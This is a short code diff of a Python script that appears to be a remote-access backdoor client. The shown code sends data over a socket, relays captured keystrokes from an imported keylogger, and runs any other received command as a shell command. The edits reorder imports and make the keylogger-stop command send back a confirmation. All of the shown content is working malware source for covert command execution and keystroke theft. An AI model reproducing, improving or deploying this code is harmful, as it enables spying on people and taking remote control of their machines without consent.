@@ -1,12 +1,13 @@
+import socket
 import json
 import subprocess
 import threading
 import keylogger
-import socket
 
 def send(data):
     jsondata = json.dumps(data)
     s.send(jsondata.encode())
+
 
 def recieve():
     data = ''
@@ -35,7 +36,7 @@ def shell():
             send(keys)
         elif command[:11] == "keylog_stop":
             klog.destruct()
-            break
+            send("Keylogger finished")
         else:
             execute = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
